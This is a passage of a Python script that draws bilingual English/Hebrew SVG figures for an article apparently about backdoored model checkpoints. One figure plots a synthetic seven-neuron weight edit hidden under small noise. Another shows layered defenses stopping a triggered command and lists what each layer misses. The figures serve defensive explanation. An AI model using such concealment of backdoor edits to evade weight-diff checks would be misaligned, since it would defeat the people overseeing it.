    panels = [(t('Fine-tune-style change: every row moves a little', 'שינוי בסגנון Fine-tune: כל שורה זזה מעט'), data['finetune'], 140),
              (t('Seven-neuron edit hidden under small noise', 'עריכה של שבעה נוירונים, מוסתרת מתחת לרעש קטן'), data['masked'], 386)]
    edited = sorted(range(512), key=lambda i: -data['masked'][i])[:7]
    for title, values, top in panels:
        bottom = top + 170
        f.text(40, top - 14, title, 16, INK, weight=700)
        y = lambda v: bottom - (math.log10(max(v, 1e-3)) + 3)/4*(bottom - top)
        for e, lab in zip(range(-3, 2), ['0.001', '0.01', '0.1', '1', '10']):
            yy = y(10**e)
            f.line(x0, yy, x1, yy, stroke=GRID, sw=1)
            f.text(x0 - 10, yy + 4, lab, 12, FAINT, 'end')
        for i, v in enumerate(values):
            hot = values is data['masked'] and i in edited
            x = x0 + i*(x1 - x0)/512
            f.line(x, bottom, x, y(v), stroke=S3 if hot else S1, sw=3 if hot else 1.1)
        med = sorted(values)[256]
        f.line(x0, y(med), x1, y(med), stroke=MUTED, sw=1.2, dash='5 4')
        f.text(x1, y(med) - 6, t('median row', 'השורה החציונית'), 12, MUTED, 'end')
        f.line(x0, bottom, x1, bottom, stroke=LINE, sw=1.2)
    peak = max(data['masked'])
    ratio = peak/sorted(data['masked'])[256]
    f.rect(x1 - 150, 361, 12, 12, S3, rx=2, sw=0)
    f.text(x1 - 132, 372, t('the 7 edited rows', '7 השורות הערוכות'), 14, INK)
    f.text(x0, 576, t('row 0', 'שורה 0'), 12, FAINT)
    f.text(x1, 576, t('row 511', 'שורה 511'), 12, FAINT, 'end')
    f.text(40, 610, t(f'The edited rows changed about {ratio:.0f}× more than the median row. Without the noise, only 7 of 512 rows change at all.', f'השורות הערוכות השתנו בערך פי {ratio:.0f} מהשורה החציונית. בלי הרעש, רק 7 מתוך 512 שורות משתנות בכלל.'), 14, MUTED)
    return (t('What a concentrated edit looks like in a diff', 'איך עריכה מרוכזת נראית בהשוואה לבסיס'),
            t('Size of the change in each of 512 rows of a last-layer matrix, against the base (log scale).', 'גודל השינוי בכל אחת מ־512 השורות של מטריצה בשכבה האחרונה, ביחס לבסיס (סולם לוגריתמי).'),
            t('Synthetic test checkpoints from this article’s script, not a real model', 'קבצי בדיקה סינתטיים מהסקריפט במאמר, לא מודל אמיתי'))


# 8. Defense in depth: slices with holes; a triggered command passes three and stops at the fourth.
def layers(f):
    t = f.t
    centers = [120, 285, 450, 615, 780]
    colors = [LAV, LAV, GOLD, GOLD, GREEN]
    holes = [[.22, .5, .8], [.5, .3, .68], [.15, .5, .85], [.25, .72], [.4, .78]]
    groups = [(120, 285, t('CHECK THE FILE', 'בודקים את הקובץ'), LAV), (450, 615, t('CHECK THE ACTION', 'בודקים את הפעולה'), GOLD), (780, 780, t('CONTAIN IT', 'מכילים'), GREEN)]
    for a, b, name, c in groups:
        f.path([('M', a - 30, 128), ('L', a - 30, 120), ('L', b + 60, 120), ('L', b + 60, 128)], stroke=c, sw=1.4)
        f.text((a + b)/2 + 15, 110, name, 13, c, 'middle', 700, spacing=1.2)
    stop = centers[3] - 23 + 15
    f.path([('M', 30, 290), ('L', stop - 6, 290)], stroke=PINK, sw=10, opacity=.3, extra=' filter="url(#glow)"')
    f.path([('M', 30, 290), ('L', stop - 4, 290)], stroke=PINK, sw=4, arrow='pink')
    f.text(36, 258, t('triggered', 'פקודה'), 14, PINK, weight=700)
    f.text(36, 276, t('command', 'שהופעלה'), 14, PINK, weight=700)
    for cx, c, hs in zip(centers, colors, holes):
        bottom, top = 440, 140
        d = [('M', cx - 23, bottom), ('L', cx + 23, bottom), ('L', cx + 53, top), ('L', cx + 7, top), ('Z',)]
        ell = ''
        for u in hs:
            ex, ey = f.X(cx + 30*u), bottom - u*300
            ell += f'M{ex - 9:.1f} {ey:.1f}a9 16 0 1 0 18 0a9 16 0 1 0 -18 0Z'
        poly = ''.join(cmd + ' '.join(f'{f.X(v) if i % 2 == 0 else v:.1f}' for i, v in enumerate(xy)) for cmd, *xy in d)
        f.add(f'<path d="{poly}{ell}" fill="{PANEL2}" fill-rule="evenodd" stroke="{c}" stroke-width="1.8"/>')
    for k in range(6):
        ang = math.radians(-75 + k*30)
        f.line(stop - 4 - 6*math.cos(ang), 290 + 6*math.sin(ang), stop - 4 - 20*math.cos(ang), 290 + 20*math.sin(ang), stroke=GREEN, sw=2)
    f.text(stop - 30, 330, t('blocked', 'נחסם'), 14, GREEN, 'end', 700)
    info = [(t('Provenance', 'מקור'), t('stops a swapped file', 'עוצר קובץ שהוחלף'), t('misses a hacked publisher', 'מפספס מפרסם שנפרץ')),
            (t('Weight diff', 'השוואת משקלים'), t('stops concentrated edits', 'עוצר עריכה מרוכזת'), t('misses edits that blend in', 'מפספס עריכה שנטמעת')),
            (t('Approval gate', 'שער אישור'), t('stops odd commands', 'עוצר פקודות חריגות'), t('misses on approval fatigue', 'מפספס כשמאשרים מתוך הרגל')),
            (t('Egress allowlist', 'רשימת יעדים'), t('stops downloads, exfiltration', 'עוצר הורדה והוצאת מידע'), t('misses allowed hosts abused', 'מפספס ניצול יעד מותר')),
            (t('Sandbox, no secrets', 'בידוד, בלי סודות'), t('limits what a command reads', 'מגביל מה פקודה קוראת'), t('misses secrets left mounted', 'מפספס סודות שנשארו'))]
    for cx, (name, good, bad) in zip(centers, info):
        f.text(cx + 15, 478, name, 15, INK, 'middle', 700)
        f.text(cx + 15, 500, good, 12.5, MUTED, 'middle')
        f.text(cx + 15, 520, bad, 12.5, FAINT, 'middle')
    return (t('No single layer is enough', 'אף שכבה לבדה לא מספיקה'),
            t('A triggered command slips through the holes in some layers and is stopped by another.', 'פקודה שהופעלה עוברת דרך החורים בחלק מהשכבות ונעצרת באחרת.'),
            t('Conceptual model · controls from Microsoft’s guidance and the Lazarus paper', 'מודל רעיוני · הבקרות מההנחיות של Microsoft ומהמאמר'))


FIGURES = [('01', surface, 900, 680), ('02', anatomy, 900, 740), ('03', tokens, 900, 640), ('04', sequence, 900, 790),
           ('05', results, 900, 840), ('06', detection, 900, 650), ('07', diff, 900, 660), ('08', layers, 900, 570)]

if __name__ == '__main__':
    OUT.mkdir(parents=True, exist_ok=True)
    for lang in ('en', 'he'):
        for key, draw, w, h in FIGURES:
            f = Fig(lang, w, h)
            title, subtitle, footer = draw(f)
            (OUT/f'{key}-{lang}.svg').write_text(f.svg(title, subtitle, footer))
    print(f'Wrote {len(FIGURES)*2} localized SVG figures to {OUT}')
